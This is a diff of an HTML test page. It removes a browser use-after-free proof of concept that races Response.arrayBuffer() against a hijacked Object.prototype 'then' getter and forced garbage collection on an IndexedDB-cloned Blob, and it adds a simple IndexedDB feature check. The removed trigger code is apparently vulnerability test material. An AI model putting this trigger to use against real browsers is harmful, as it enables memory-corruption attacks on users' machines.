@@ -1,117 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>FormDataConsumer UAF test</title>
-</head>
 <body>
-<pre id="log">Starting test...</pre>
+<pre id="out"></pre>
 <script>
-var output=[];
-var getterTriggered=false;
+var names=[
+"indexedDB",
+"webkitIndexedDB",
+"IDBFactory",
+"IDBDatabase",
+"IDBObjectStore",
+"IDBTransaction"
+];
 
-function log(s){
-    output.push(s);
-    document.getElementById("log").textContent=output.join("\n");
+var out=[];
+for(var i=0;i<names.length;i++){
+    out.push(names[i]+": "+typeof window[names[i]]);
 }
-
-function gcRec(n){
-    if(n<=0)
-        return;
-    var temp="";
-    for(var i=0;i<10000;i++){
-        var obj={i:"ab"+i+(i/100000)};
-        temp+="foo";
-    }
-    gcRec(n-1);
-}
-
-function createClonedBlobWithIndexedDB(){
-    return new Promise(function(resolve,reject){
-        var request=indexedDB.open("db"+Math.random(),1);
-
-        request.onupgradeneeded=function(e){
-            var db=e.target.result;
-            db.createObjectStore("storage",{keyPath:"id"});
-        };
-
-        request.onerror=function(){
-            reject(request.error);
-        };
-
-        request.onsuccess=function(e){
-            var db=e.target.result;
-            var transaction=db.transaction(["storage"],"readwrite");
-            var objectStore=transaction.objectStore("storage");
-
-            var storeRequest=objectStore.put({
-                id:1,
-                data:new Blob(["aa"])
-            });
-
-            storeRequest.onsuccess=function(){
-                objectStore.get(1).onsuccess=function(e){
-                    log("IndexedDB Blob retrieved");
-
-                    if(typeof gc==="function"){
-                        gc();
-                        log("Native gc() called");
-                    }else{
-                        gcRec(10);
-                        log("Allocation pressure GC helper executed");
-                    }
-
-                    resolve(e.target.result.data);
-                    db.close();
-                };
-            };
-
-            storeRequest.onerror=function(){
-                reject(storeRequest.error);
-            };
-        };
-    });
-}
-
-createClonedBlobWithIndexedDB().then(function(blob){
-    log("Blob size: "+blob.size);
-
-    return new Promise(function(resolve){
-        setTimeout(resolve,100);
-    });
-}).then(function(blob){
-    var formData=new FormData();
-    formData.append("a",blob);
-
-    var response=new Response(formData);
-
-    Object.prototype.__defineGetter__("then",function(){
-        getterTriggered=true;
-        response=null;
-
-        log("Getter then triggered");
-        log("Response reference cleared");
-
-        if(typeof gc==="function"){
-            gc();
-            log("Native gc() called");
-        }else{
-            gcRec(10);
-            log("Allocation pressure GC helper executed");
-        }
-    });
-
-    log("Calling response.arrayBuffer()");
-    response.arrayBuffer();
-
-    setTimeout(function(){
-        log("Test sequence completed");
-        log("Getter triggered: "+getterTriggered);
-    },200);
-
-}).catch(function(e){
-    log("ERROR: "+e.name+": "+e.message);
-});
+document.getElementById("out").textContent=out.join("\n");
 </script>
 </body>
 </html>
